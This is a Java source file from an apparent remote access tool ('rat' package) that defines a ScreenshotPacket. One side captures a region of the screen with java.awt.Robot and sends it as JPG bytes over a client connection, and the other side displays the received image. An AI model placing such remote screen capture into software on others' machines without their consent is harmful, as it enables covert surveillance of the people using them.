package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import javax.imageio.ImageIO;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.rat.ActiveClient;

public final class ScreenshotPacket implements IPacket {
	
	private BufferedImage image;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(100, 100, BufferedImage.TYPE_INT_RGB);
	
	public ScreenshotPacket() {
		image = NO_IMAGE;
	}
	
	public ScreenshotPacket(final int x, final int y, final int width, final int height) {
		try {
			final Robot robot = new Robot();
			
			image = robot.createScreenCapture(new Rectangle(x, y, width, height));
		} catch (final AWTException ex) {
			image = NO_IMAGE;
			
			ex.printStackTrace();
		}
	}
	
	@Override
	public void send(final ActiveClient client) {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		
		try {
			ImageIO.write(image, "JPG", out);
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
		
		final byte[] data = out.toByteArray();
		
		client.writeInt(data.length);
		client.write(data);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		final int length = client.readInt();
		final byte[] data = new byte[length];
		
		client.read(data);
		
		final ByteArrayInputStream in = new ByteArrayInputStream(data);
		
		try {
			image = ImageIO.read(in);
		} catch (final IOException ex) {
			image = NO_IMAGE;
			
			ex.printStackTrace();
		}
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		final Screen screen = new Screen(width, height);
		
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, width, height, null);
		});
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.show();
		screen.redraw();
	}
	
}
